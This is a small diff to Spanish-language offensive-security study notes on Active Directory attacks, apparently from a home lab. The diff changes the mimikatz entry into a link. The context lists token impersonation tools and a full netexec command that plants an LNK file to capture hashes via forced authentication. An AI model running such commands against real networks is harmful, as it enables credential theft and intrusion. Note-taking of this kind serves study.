@@ -54,7 +54,7 @@
     - Cuando comprometemos una cuenta, un ataque para empezar es este.
 - Token impersonation attack
     - psexec
-    - mimikatz
+    - [mimikatz](./mimikatz.md)
     - [pypykatz](./pypykatz.md)
 - [LNK File Attacks](https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication#execution-via-.rtf): `netexec smb 192.168.138.137 -d marvel.local -u fcastle -p Password1 -M slinky -o NAME=test SERVER=192.168.138.149`
     - Código:
